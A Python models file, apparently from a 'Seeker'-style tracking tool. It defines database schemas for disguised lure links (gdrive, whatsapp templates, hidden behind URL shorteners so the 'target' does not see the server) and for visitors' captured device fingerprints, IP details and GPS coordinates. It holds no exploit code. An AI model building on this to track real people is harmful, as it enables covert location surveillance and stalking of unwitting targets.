"""Seeker link and result models for geolocation/device-info collection."""

from __future__ import annotations

import secrets
from datetime import UTC, datetime
from typing import Any

from beanie import Document, Indexed, Insert, Replace, before_event
from pydantic import Field
from pymongo import IndexModel

from app.utils.validators import PyObjectId


def _generate_short_code() -> str:
    """Generate a short URL-safe code (8 chars, lowercase + digits)."""
    alphabet = "abcdefghjkmnpqrstuvwxyz23456789"  # exclude 0,o,1,l,i
    return "".join(secrets.choice(alphabet) for _ in range(8))


class SeekerLink(Document):
    """Seeker tracking link - one per campaign/session."""

    userId: Indexed(PyObjectId)
    template: str  # nearyou, gdrive, whatsapp, etc.
    title: str | None = None
    redirectUrl: str | None = None
    shortCode: str | None = None  # e.g. x7k2ab9c for /l/x7k2ab9c redirect
    externalUrl: str | None = (
        None  # anonymized URL from v.gd/is.gd/tinyurl - target sees this, not our server
    )
    createdAt: datetime = Field(default_factory=lambda: datetime.now(UTC))
    updatedAt: datetime | None = None
    expiresAt: datetime | None = None

    @before_event([Insert, Replace])
    def set_timestamps(self) -> None:
        now = datetime.now(UTC)
        if self.createdAt is None:
            self.createdAt = now
        self.updatedAt = now

    class Settings:
        name = "seeker_links"
        indexes = [
            "userId",
            "template",
            [
                ("createdAt", -1),
            ],
            IndexModel(
                [("shortCode", 1)],
                name="shortCode_unique",
                unique=True,
                partialFilterExpression={"shortCode": {"$type": "string"}},
            ),
        ]


class SeekerResult(Document):
    """Seeker result - one per visitor (device info + location merged)."""

    linkId: Indexed(PyObjectId)
    # Device info (from info endpoint)
    platform: str | None = None
    browser: str | None = None
    cores: str | None = None
    ram: str | None = None
    vendor: str | None = None
    render: str | None = None
    wd: str | None = None
    ht: str | None = None
    os: str | None = None
    ip: str = ""
    # IP recon (populated by backend)
    ipInfo: dict[str, Any] | None = None
    # Location (from result endpoint, status=success)
    lat: str | None = None
    lon: str | None = None
    acc: str | None = None
    alt: str | None = None
    dir: str | None = None
    spd: str | None = None
    # Or error (status=failed)
    error: str | None = None
    status: str = "pending"  # pending | success | failed
    createdAt: datetime = Field(default_factory=lambda: datetime.now(UTC))

    class Settings:
        name = "seeker_results"
        indexes = [
            "linkId",
            [
                ("createdAt", -1),
            ],
        ]
